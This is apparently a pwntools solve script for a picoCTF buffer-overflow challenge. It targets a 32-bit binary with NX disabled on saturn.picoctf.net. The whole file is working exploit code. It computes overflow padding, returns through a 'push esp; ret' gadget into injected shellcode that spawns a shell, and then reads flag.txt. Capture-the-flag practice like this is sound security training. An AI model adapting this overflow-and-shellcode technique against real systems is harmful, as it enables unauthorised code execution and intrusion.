'''
tags: `bof`, `ROP`, `shellcode`

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=3aa2bb6a5bf44d90a355da83fa909bbf5d9d90ce, for GNU/Linux 3.2.0, not stripped
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 51050

elf = ELF('./vuln')

context.binary = elf
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b main
b vuln
b *0x08049dd0
'''

# gadgets
## 0x080b075a : push esp ; ret
push_esp = 0x080b075a

# plt
main_plt = elf.symbols['main']
vuln_plt = elf.symbols['vuln']

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        import os
        r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'grasshopper!\n')
    padding = cyclic_find(0x61616168)
    print (padding)
    payload = b'a' * padding
    payload += p32(push_esp)
    payload += asm(shellcraft.sh())
    r.sendline(payload)

def flag(r):
    r.sendline(b'cat flag.txt')
    print (r.recvuntil(b'}').decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    if args.FLAG:
        flag(r)
        r.close()
    else:
        r.interactive()